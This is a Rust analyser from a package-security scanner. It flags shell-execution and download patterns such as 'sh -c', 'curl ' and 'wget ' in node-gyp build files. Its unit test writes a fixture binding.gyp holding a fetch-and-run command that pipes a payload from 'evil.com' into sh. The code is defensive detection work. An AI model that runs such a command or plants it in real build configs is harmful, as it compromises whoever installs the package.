//! Phantom Gyp shell injection and node-gyp build file analyser.

use std::fs;
use std::path::{Path, PathBuf};

use crate::traits::Analyser;
use crate::types::{PackageArchive, Result, Signal};

/// Analyser for shell injection and command execution in binding.gyp and build files.
#[derive(Debug, Default)]
pub struct PhantomGypAnalyser;

impl PhantomGypAnalyser {
    /// Creates a new `PhantomGypAnalyser`.
    pub fn new() -> Self {
        Self
    }
}

fn collect_files(dir: &Path, rel_prefix: &Path, out: &mut Vec<PathBuf>) {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            let rel = rel_prefix.join(entry.file_name());
            if path.is_dir() {
                collect_files(&path, &rel, out);
            } else if path.is_file() {
                out.push(rel);
            }
        }
    }
}

impl Analyser for PhantomGypAnalyser {
    fn analyse(&self, pkg: &PackageArchive) -> Result<Vec<Signal>> {
        let mut signals = Vec::new();
        let mut files = Vec::new();
        collect_files(&pkg.extracted_path, Path::new(""), &mut files);

        for file_path in files {
            let file_name = file_path.file_name().and_then(|f| f.to_str()).unwrap_or("");
            if file_name != "binding.gyp" && file_name != "wscript" && !file_name.ends_with(".gyp") {
                continue;
            }

            let full_path = pkg.extracted_path.join(&file_path);
            let content = match fs::read_to_string(&full_path) {
                Ok(c) => c,
                Err(_) => continue,
            };

            if content.contains("sh -c")
                || content.contains("bash -c")
                || content.contains("cmd.exe /c")
                || content.contains("powershell")
                || content.contains("curl ")
                || content.contains("wget ")
            {
                signals.push(Signal::PhantomGyp {
                    file: file_path.clone(),
                    pattern: "shell execution or network download payload in gyp build config".into(),
                });
            }
        }

        Ok(signals)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{Ecosystem, PackageId, PackageManifest};
    use tempfile::tempdir;

    #[test]
    fn phantom_gyp_shell_injection_detection() {
        let dir = tempdir().unwrap();
        let file_path = dir.path().join("binding.gyp");
        fs::write(&file_path, "{\"targets\": [{\"action\": [\"sh -c\", \"curl http://evil.com/payload | sh\"]}]}").unwrap();

        let analyser = PhantomGypAnalyser::new();
        let pkg = PackageArchive {
            id: PackageId {
                name: "native-addon".into(),
                version: "1.0.0".into(),
                ecosystem: Ecosystem::Npm,
            },
            extracted_path: dir.path().to_path_buf(),
            manifest: PackageManifest::default(),
            tarball: vec![],
        };

        let signals = analyser.analyse(&pkg).unwrap();
        assert_eq!(signals.len(), 1);
        match &signals[0] {
            Signal::PhantomGyp { pattern, .. } => {
                assert!(pattern.contains("shell execution"));
            }
            _ => panic!("expected PhantomGyp signal"),
        }
    }
}
